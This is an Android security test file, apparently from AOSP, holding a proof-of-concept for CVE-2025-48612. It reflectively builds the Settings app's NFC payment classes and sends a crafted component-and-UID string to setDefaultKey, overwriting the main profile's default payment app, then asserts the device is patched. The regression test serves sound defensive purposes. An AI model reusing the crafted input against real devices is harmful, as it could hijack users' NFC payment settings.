/*
 * Copyright (C) 2025 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts;

import static android.Manifest.permission.INTERACT_ACROSS_USERS;
import static android.Manifest.permission.WRITE_SECURE_SETTINGS;

import static androidx.test.core.app.ApplicationProvider.getApplicationContext;
import static androidx.test.platform.app.InstrumentationRegistry.getInstrumentation;

import static com.android.compatibility.common.util.SystemUtil.runWithShellPermissionIdentity;
import static com.android.sts.common.SystemUtil.withSetting;

import static com.google.common.truth.Truth.assertWithMessage;
import static com.google.common.truth.TruthJUnit.assume;

import static org.mockito.Mockito.any;
import static org.mockito.Mockito.anyInt;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

import android.content.Context;
import android.content.Intent;
import android.os.UserHandle;
import android.os.UserManager;
import android.platform.test.annotations.AsbSecurityTest;
import android.provider.Settings;

import androidx.test.platform.app.InstrumentationRegistry;
import androidx.test.runner.AndroidJUnit4;

import com.android.compatibility.common.util.UserSettings;
import com.android.sts.common.util.StsExtraBusinessLogicTestCase;

import org.junit.Test;
import org.junit.runner.RunWith;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Collections;
import java.util.concurrent.CompletableFuture;

@RunWith(AndroidJUnit4.class)
public class CVE_2025_48612 extends StsExtraBusinessLogicTestCase {

    @Test
    @AsbSecurityTest(cveBugId = 429417453)
    public void testPocCVE_2025_48612() {
        // Set nfc_payment_default_component to 'cve_2025_48612_payment'.
        try (AutoCloseable autoCloseable =
                withSetting(
                        getInstrumentation(),
                        "secure",
                        "nfc_payment_default_component",
                        "cve_2025_48612_payment")) {
            // Create a Context for the Settings app.
            final Context context = getApplicationContext();
            final Context settingsContext =
                    context.createPackageContext(
                            new Intent(Settings.ACTION_SETTINGS)
                                    .resolveActivity(context.getPackageManager())
                                    .getPackageName(),
                            Context.CONTEXT_IGNORE_SECURITY | Context.CONTEXT_INCLUDE_CODE);

            // Load 'DefaultPaymentSettings' class and create an instance of it.
            final ClassLoader classLoader = settingsContext.getClassLoader();
            final Class defaultPaymentSettingsClass =
                    classLoader.loadClass("com.android.settings.nfc.DefaultPaymentSettings");
            final CompletableFuture<Object> fetchedDefaultPaymentSettingsObject =
                    new CompletableFuture<Object>();
            createDefaultPaymentSettings(
                    context,
                    classLoader,
                    defaultPaymentSettingsClass,
                    fetchedDefaultPaymentSettingsObject);

            // Call the vulnerable function 'setDefaultKey'.
            final String testPkgName = context.getPackageName();
            try {
                final Object defaultPaymentSettingsInstance =
                        fetchedDefaultPaymentSettingsObject.getNow(null);
                final Method setDefaultKeyMethod =
                        defaultPaymentSettingsClass.getDeclaredMethod(
                                "setDefaultKey", String.class);
                setDefaultKeyMethod.setAccessible(true);
                runWithShellPermissionIdentity(
                        () -> {
                            // Invoke the vulnerbale method 'setDefaultKey' by passing a string
                            // which consists of 'ComponentName' followed by main profile's uid and
                            // work profile's uid.
                            // Without fix, the vulnerable method split the string and
                            // pre-assumes main profile's uid as work profile's uid. Because of
                            // this incorrect assumption, instead of setting of
                            // 'nfc_payment_default_component' of work profile,
                            // 'nfc_payment_default_component' of main profile is set with
                            // 'ComponentName'.
                            // With fix, string is serialized which prevent setting of
                            // 'nfc_payment_default_component' of main profile with 'ComponentName'.
                            setDefaultKeyMethod.invoke(
                                    defaultPaymentSettingsInstance,
                                    testPkgName
                                            + "/"
                                            + testPkgName
                                            + " "
                                            + context.getUserId()
                                            + " -1" /* Invalid UID*/);
                        },
                        INTERACT_ACROSS_USERS,
                        WRITE_SECURE_SETTINGS);
            } catch (Exception ignore) {
                // Ignore the exception.
            }

            // Store the value of 'nfc_payment_default_component'.
            final UserSettings userSettings = new UserSettings(UserSettings.Namespace.of("secure"));
            final String nfcComponentName = userSettings.get("nfc_payment_default_component");

            // Without fix, nfc_payment_default_component is set with 'testPkgName'.
            assertWithMessage(
                            "Device is vulnerable b/429417453 !!, nfc_payment_default_component is"
                                    + " set")
                    .that(nfcComponentName.contains(testPkgName + "/" + testPkgName))
                    .isFalse();
        } catch (Exception e) {
            assume().that(e).isNull();
        }
    }

    private void createDefaultPaymentSettings(
            Context context,
            ClassLoader classLoader,
            Class defaultPaymentSettingsClass,
            CompletableFuture<Object> fetchedDefaultPaymentSettingsObject)
            throws Exception {
        // Create an instance of 'PaymentBackend' which will be passes as an argument in
        // constructor of 'DefaultPaymentSettings'.
        final Object paymentBackendInstance = createPaymentBackendObject(context, classLoader);

        // Create an instance of 'DefaultPaymentSettings' on main thread.
        InstrumentationRegistry.getInstrumentation()
                .runOnMainSync(
                        () -> {
                            try {
                                // Create an instance of 'DefaultPaymentSettings' class.
                                final Object defaultPaymentSettingsInstance =
                                        defaultPaymentSettingsClass
                                                .getDeclaredConstructor()
                                                .newInstance();

                                // Set 'paymentBackendInstance' in 'mPaymentBackend'.
                                final Field backendField =
                                        defaultPaymentSettingsClass.getDeclaredField(
                                                "mPaymentBackend");
                                backendField.setAccessible(true);
                                backendField.set(
                                        defaultPaymentSettingsInstance, paymentBackendInstance);
                                fetchedDefaultPaymentSettingsObject.complete(
                                        defaultPaymentSettingsInstance);
                            } catch (Exception e) {
                                assume().that(e).isNull();
                            }
                        });
    }

    private Object createPaymentBackendObject(Context context, ClassLoader classLoader)
            throws Exception {
        // Load 'PaymentBackend' class and its constructor.
        final Class paymentBackendClass =
                classLoader.loadClass("com.android.settings.nfc.PaymentBackend");
        final Constructor paymentBackendConstructor =
                paymentBackendClass.getDeclaredConstructor(Context.class);
        paymentBackendConstructor.setAccessible(true);

        // Create an instance of 'PaymentBackend' class with mock context (required to bypass
        // internal checks).
        final Object paymentBackendInstance =
                runWithShellPermissionIdentity(
                        () -> {
                            return paymentBackendConstructor.newInstance(
                                    createMockContext(context));
                        },
                        INTERACT_ACROSS_USERS);
        assume().withMessage("Failed to create PaymentBackend object ")
                .that(paymentBackendInstance)
                .isNotNull();

        // Reset 'mContext' with real context.
        final Field contextField = paymentBackendClass.getDeclaredField("mContext");
        contextField.setAccessible(true);
        contextField.set(paymentBackendInstance, context);
        return paymentBackendInstance;
    }

    private Context createMockContext(Context context) {
        // Create mock 'UserManager'.
        final UserManager mockUm = mock(UserManager.class);
        when(mockUm.getUserProfiles()).thenReturn(Collections.<UserHandle>emptyList());

        // Create mock 'Context'.
        final Context mockContext = mock(Context.class);
        when(mockContext.createContextAsUser(any(UserHandle.class), anyInt()))
                .thenReturn(mockContext);
        when(mockContext.getApplicationContext()).thenReturn(context.getApplicationContext());
        when(mockContext.getSystemServiceName(UserManager.class)).thenReturn(Context.USER_SERVICE);
        when(mockContext.getSystemService(UserManager.class)).thenReturn(mockUm);
        return mockContext;
    }
}
